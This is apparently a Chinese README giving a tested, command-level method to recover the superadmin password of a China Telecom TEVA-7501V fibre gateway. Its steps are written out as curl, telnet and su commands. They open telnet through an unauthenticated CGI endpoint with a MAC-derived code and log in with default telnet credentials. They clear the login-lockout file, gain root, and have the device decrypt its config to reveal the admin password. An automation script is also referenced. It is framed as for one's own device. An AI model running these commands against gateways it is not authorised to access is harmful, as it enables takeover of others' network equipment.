# TEVA-7501V 超级管理员口令获取方法

> 电信 10G EPON 天翼网关，标签写 **TEVA-7501V**。
> 内部型号 `TEWA-7501V`，厂商 `tianyi`，固件 `Tianyi_V1.0_JS2511`。
> 海思平台，主机名 `hsan`，生产日期 2026-09-28。
> 下面每一步都在这台机器上跑通过。凭据已脱敏，只对自有设备用。

![status](https://img.shields.io/badge/status-%E5%B7%B2%E9%AA%8C%E8%AF%81-brightgreen) ![device](https://img.shields.io/badge/device-TEVA--7501V-blue)

---

## 30 秒速查

| 项 | 结果 |
|---|---|
| 超管账号 | `telecomadmin` |
| 超管口令 | `telecomadmin` + **8 位数字**（TR-069 下发时随机化） |
| **生效入口** | `http://192.168.1.1:8080`（`Server: HomeGateway`，`/usr/bin/web`） |
| 80 端口 | **不认**超管，只认 `useradmin` + 标签口令 |
| 口令来源 | 设备自解明文 `/config/work/lastgood.xml` → `SYSMNG_ACCOUNT_ATTR_TAB.aucTeleAccountPassword` |
| 需要的三样 | ① MAC 后 8 位 ② A1 **第 5 张表** ③ 能 telnet 到 LAN |

---

## 为什么容易走错

```
× 猜      telecomadmin + 随机 8 位。web 3 次/60s 就锁。
× 爆配置  lastgood.xml 用 AES-CBC。key 每次启动随机，只在内存。
× 走 80   80 是 uhttpd+SAF。走 CheckUAPasswd 分支，不认超管。
√ 走 8080 /usr/bin/web 才管超管。
√ 让设备解 hi_decrypt_file 按文件名吐明文。
```

---

## 五步流程（命令级）

### 1. 分清两个入口

80 和 8080 是两套程序。
走错门，怎么试都不对。

```bash
nmap -Pn -n --open -p 21,23,80,443,8080,17998 192.168.1.1
# 80   → LuCI/uhttpd + SAF 插件，账号：useradmin
# 8080 → Server: HomeGateway，/usr/bin/web，账号：telecomadmin / useradmin
# 23   → 默认关闭，靠 8080 的 entelnet.cgi 打开
```

### 2. 用 A1 算口令（必须第 5 张表）

A1 是这台机器的口令算法。
输入是 MAC 后 8 位倒序。
天邑把 `Verification_code` 与 `su` 口令绑成同一个值。
写法是 `A1(表N, MAC 后 8 位倒序)`。
本机 MAC 为 `CC:6D:55:xx:xx:CD`，五张表结果如下：

```
表1 MTBjwaFr   表2 fKCaedbq   表3 bUwqNNSa   表4 MTBvHaFD   表5 <A1衍生值> ← 生效
```

前 4 张全回 `Verification code Error!`。
第 5 张是海思版，一把 `SUCCESS`。
网上说「mac_a1 对 7501V 无效」，其实是选错表。
算法原文见 [docs/01-methodology.md](docs/01-methodology.md) §3.4。

### 3. 打开 LAN telnet

空请求只回 MAC，用来确认接口活着。
A1 值必须放 form body。

```bash
curl -s -X POST http://192.168.1.1:8080/entelnet.cgi
# → {"retcode":"0","data":{"result":"BaseMac=(CC6D55xxxxxxCD)"}}      信息模式

curl -s -X POST http://192.168.1.1:8080/entelnet.cgi --data 'Verification_code=<A1衍生值>'
# → {"retcode":"0","data":{"status=SUCCESS"}}   随后 23/tcp open（nmap 复核）

curl -s -X POST http://192.168.1.1:8080/distelnet.cgi   # 用完必须关
```

放进 query 会被当空值。
结果永远只回 `BaseMac`。

### 4. 用真 tty 执行 su

busybox 的 `su` 看着像坏了，其实没给它终端。
管道喂 stdin，它不打印 `Password:`。
然后静默 `exit 1`，看着就像口令错。

```bash
telnet 192.168.1.1        # telnetadmin / telnetadmin → $
: > /tmp/login/login_status_log        # 清 60 秒全局授权锁（该文件 0666）
su -c 'id'                # 等 Password: 出现再投 <A1衍生值>
# → uid=0(root) gid=0(root)
```

`su_main` 先看 `ttyname()` 有无 `/dev/pts/` 前缀。
再用 `ioctl(SIOCGIFHWADDR)` 取 `br0` MAC。
接着 `encode_password()`、`strcmp()`。
`/etc/shadow` 只是干扰。
root 与 telnetadmin 的 `$6$` 都等于 `telnetadmin`。

### 5. 让设备解配置，再取口令

配置在盘上是密文。
设备自带 `IPC` 命令，喂文件名就吐明文。
不用我们爆 key。

```bash
su -c "hi_ipc /home/cmd/encrypt/decrypt_file \\
        -v ifile /config/work/lastgood.xml ofile /tmp/lg.xml"
# → /tmp/lg.xml = 233333 B 明文 XML
grep -A1 'aucTeleAccountName' /tmp/lg.xml
#   <Value Name="aucTeleAccountName" Value="telecomadmin"/>
#   <Value Name="aucTeleAccountPassword" Value="telecomadmin<8位数字>"/>
```

搬回本地分四步。
先 `gzip -9`，再 `base64`，去掉换行。
然后 `dd bs=98304 skip=N count=1` 分块拉。
最后 md5 对账。

---

## 端点速查（8080）

登录前只能用前四个。
后两个要超管会话。

| 端点 | 鉴权 | 用途 |
|---|---|---|
| `/entelnet.cgi`、`/distelnet.cgi` | 免登录 | 开/关 LAN telnet（body 传 `Verification_code`） |
| `/web_loid_auth_show.cgi`、`/web_query_register_status.cgi` | 免登录 | LOID、光功率、注册状态 |
| `/session_key_show.cgi` | 免登录 | 取 31 位 `Sessionkey`（**一次一用**） |
| `/web_login_exe.cgi` | 免登录（提交登录） | `web_login_name=base64(user)` + `web_login_password=ivHex+AES256CBC` |
| `/get_telnet_show.cgi` | 需超管 | 回显 telnet 账号、23 端口、WAN 侧关闭 |
| `/web_query_user_show.cgi` | 需超管 | 回显 `useradmin` / `telecomadmin` 两个账号名 |

290 个处理器名不是猜的。
来源是二进制日志串 `[WEB:%s(%d)]>>ENTER xxx_cgi`。

---

## 验证与清场

先验通道，再验超管，最后清场。

```bash
# 控制实验：已知正确的普通账号先登一次
curl -s -i -X POST http://192.168.1.1/cgi-bin/luci \\
  --data-urlencode username=useradmin --data-urlencode psd=<标签口令> | head -3
# → 302 + Set-Cookie: sysauth=<32hex>   = 通道正常

# 超管只在 8080 生效
python3 scripts/recover_superpass_template.py   # 全流程 + 自清场
# 手工：POST /web_login_exe.cgi → {"retcode":"1","data":{"result":"success_telecomadmin"}}

# 收尾
curl -s -X POST http://192.168.1.1:8080/distelnet.cgi
timeout 5 bash -c 'exec 3<>/dev/tcp/192.168.1.1/23' || echo "23 已关"
```

---

## 六个容易踩的坑

每个坑都会让你误判成口令错。

| # | 坑 | 正确做法 |
|---|---|---|
| 1 | 用 GET 打 `.cgi` 得 400，以为接口不存在 | 这台机器只收 **POST** |
| 2 | 管道喂 `su` 得 `Error!`，以为口令错 | 真 tty，等 `Password:` |
| 3 | 拿 80 端口试超管，失败就以为口令错 | 80 只认 `useradmin`，超管入口是 8080 |
| 4 | 离线爆 AES key | key 只在 encrypt 线程内存，结构上不可能 |
| 5 | 点后台「维护结束」/「恢复出厂」 | TR-069 会重新随机化超管口令 |
| 6 | 多个会话同时 telnet | telnetd 单会话，互相踢，人人以为被锁 |

---

## 目录

| 文件 | 内容 |
|---|---|
| [docs/01-methodology.md](docs/01-methodology.md) | 通用方法论：五阶段、四档响应语义、A1 五表、加密五连判定、10 条反面模式、可复用清单 |
| [docs/03-case-study-tewa7501v.md](docs/03-case-study-tewa7501v.md) | 本机完整案例：设备档案、口令入口表、三处卡点正解、证据链、时间线 |
| [scripts/recover_superpass_template.py](scripts/recover_superpass_template.py) | 可复现脚本模板：开 telnet → su → 设备自解 → 分块搬回 → 提口令 → 关 telnet |

---

## 使用边界

- 只对**自有设备**。本次是家里自购光猫，目的是接管自家网关。
- 全程**零写操作**：没改口令、没恢复出厂、没动 LOID/TR-069。
- 想长期稳定：把 **ACS 地址置空**。
  TR-069 是口令被随机化的根源。
  别删整条连接，可能断网。
- 收工必做：关 telnet、清 `/tmp` 临时件、清失败计数。

---

许可为 [MIT](LICENSE)
